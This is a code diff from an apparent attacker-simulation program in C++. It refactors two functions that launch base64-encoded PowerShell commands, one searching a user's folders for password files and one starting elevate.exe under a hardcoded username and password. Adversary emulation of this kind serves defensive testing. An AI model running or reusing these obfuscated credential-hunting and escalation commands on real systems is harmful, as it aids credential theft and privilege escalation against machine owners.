@@ -18,36 +18,10 @@ int wmain() {
 void SearchForPass() {
 	// simulate attacker looking for password docs with powershell
 	Log("[*] Searching for password doc", componentName);
-	STARTUPINFO si;
-	PROCESS_INFORMATION pi;
-	ZeroMemory(&si, sizeof(si));
-	si.cb = sizeof(si);
-	ZeroMemory(&pi, sizeof(pi));
 
-	// Get-ChildItem -Path C:\Users\NineBall -Filter 'password' -Recurse -ErrorAction Continue -Force
-	std::wstring cmd = L"powershell.exe -encodedCommand RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgAEMAOgBcAFUAcwBlAHIAcwBcAE4AaQBuAGUAQgBhAGwAbAAgAC0ARgBpAGwAdABlAHIAIAAnAHAAYQBzAHMAdwBvAHIAZAAnACAALQBSAGUAYwB1AHIAcwBlACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABDAG8AbgB0AGkAbgB1AGUAIAAtAEYAbwByAGMAZQA=";
+	std::string cmdline = "powershell.exe -encodedCommand RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgAEMAOgBcAFUAcwBlAHIAcwBcAE4AaQBuAGUAQgBhAGwAbAAgAC0ARgBpAGwAdABlAHIAIAAnAHAAYQBzAHMAdwBvAHIAZAAnACAALQBSAGUAYwB1AHIAcwBlACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABDAG8AbgB0AGkAbgB1AGUAIAAtAEYAbwByAGMAZQA=";
+	CreateProc("SearchForPass", cmdline);
 
-	if (!CreateProcessW(
-		NULL,
-		const_cast<LPWSTR>(cmd.c_str()),
-		NULL,
-		NULL,
-		FALSE,
-		0,
-		NULL,
-		NULL,
-		&si,
-		&pi
-	)) {
-		Log("[!] Failed to create password doc search powershell process." + std::to_string(GetLastError()), componentName);
-	}
-	else {
-		Log("[+] Successfully created password doc search powershell process.", componentName);
-	}
-
-	WaitForSingleObject(pi.hProcess, INFINITE);
-	CloseHandle(pi.hProcess);
-	CloseHandle(pi.hThread);
 }
 
 void GetCreds() {
@@ -100,42 +74,13 @@ void Elevate() {
 
 	// create elevate process as NineBall
 	Log("[+] Starting elevate.", componentName);
-	STARTUPINFO si;
-	PROCESS_INFORMATION pi;
-	ZeroMemory(&si, sizeof(si));
-	si.cb = sizeof(si);
-	ZeroMemory(&pi, sizeof(pi));
 
-	//std::wstring cmd = 
-	//	L"powershell.exe -Command "
-	//	L"$username = 'NineBall'; "
-	//	L"$password = 'SuperSecurePassword1!'; "
-	//	L"$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; "
-	//	L"$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; "
-	//	L"Start-Process C:\\Temp\\elevate.exe -Credential $credential;";
+	// powershell.exe -Command $username = 'NineBall'; $password = 'SuperSecurePassword1!';
+	// $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
+	// $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+	// Start-Process C:\\Temp\\elevate.exe -Credential $credential;
+	std::string cmdline = "powershell.exe -encodedCommand JAB1AHMAZQByAG4AYQBtAGUAIAA9ACAAJwBOAGkAbgBlAEIAYQBsAGwAJwA7ACAAJABwAGEAcwBzAHcAbwByAGQAIAA9ACAAJwBTAHUAcABlAHIAUwBlAGMAdQByAGUAUABhAHMAcwB3AG8AcgBkADEAIQAnADsAIAAkAHMAZQBjAHUAcgBlAFAAYQBzAHMAdwBvAHIAZAAgAD0AIABDAG8AbgB2AGUAcgB0AFQAbwAtAFMAZQBjAHUAcgBlAFMAdAByAGkAbgBnACAAJABwAGEAcwBzAHcAbwByAGQAIAAtAEEAcwBQAGwAYQBpAG4AVABlAHgAdAAgAC0ARgBvAHIAYwBlADsAIAAkAGMAcgBlAGQAZQBuAHQAaQBhAGwAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBQAFMAQwByAGUAZABlAG4AdABpAGEAbAAgACQAdQBzAGUAcgBuAGEAbQBlACwAIAAkAHMAZQBjAHUAcgBlAFAAYQBzAHMAdwBvAHIAZAA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAEMAOgBcAFwAVABlAG0AcABcAFwAZQBsAGUAdgBhAHQAZQAuAGUAeABlACAALQBDAHIAZQBkAGUAbgB0AGkAYQBsACAAJABjAHIAZQBkAGUAbgB0AGkAYQBsADsA";
 
-	std::wstring cmd = L"powershell.exe -encodedCommand JAB1AHMAZQByAG4AYQBtAGUAIAA9ACAAJwBOAGkAbgBlAEIAYQBsAGwAJwA7ACAAJABwAGEAcwBzAHcAbwByAGQAIAA9ACAAJwBTAHUAcABlAHIAUwBlAGMAdQByAGUAUABhAHMAcwB3AG8AcgBkADEAIQAnADsAIAAkAHMAZQBjAHUAcgBlAFAAYQBzAHMAdwBvAHIAZAAgAD0AIABDAG8AbgB2AGUAcgB0AFQAbwAtAFMAZQBjAHUAcgBlAFMAdAByAGkAbgBnACAAJABwAGEAcwBzAHcAbwByAGQAIAAtAEEAcwBQAGwAYQBpAG4AVABlAHgAdAAgAC0ARgBvAHIAYwBlADsAIAAkAGMAcgBlAGQAZQBuAHQAaQBhAGwAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBQAFMAQwByAGUAZABlAG4AdABpAGEAbAAgACQAdQBzAGUAcgBuAGEAbQBlACwAIAAkAHMAZQBjAHUAcgBlAFAAYQBzAHMAdwBvAHIAZAA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAEMAOgBcAFwAVABlAG0AcABcAFwAZQBsAGUAdgBhAHQAZQAuAGUAeABlACAALQBDAHIAZQBkAGUAbgB0AGkAYQBsACAAJABjAHIAZQBkAGUAbgB0AGkAYQBsADsA";
+	CreateProc("elevate", cmdline);
 
-	if (!CreateProcessW(
-		NULL,
-		const_cast<LPWSTR>(cmd.c_str()),
-		NULL,
-		NULL,
-		FALSE,
-		0,
-		NULL,
-		NULL,
-		&si,
-		&pi
-	)) {
-		Log("[!] Failed to create elevate process." + std::to_string(GetLastError()), componentName);
-	}
-	else {
-		Log("[+] Successfully created elevate process.", componentName);
-	}
-
-	// unsure if these will cause dropper to stay up
-	WaitForSingleObject(pi.hProcess, INFINITE);
-	CloseHandle(pi.hProcess);
-	CloseHandle(pi.hThread);
 }
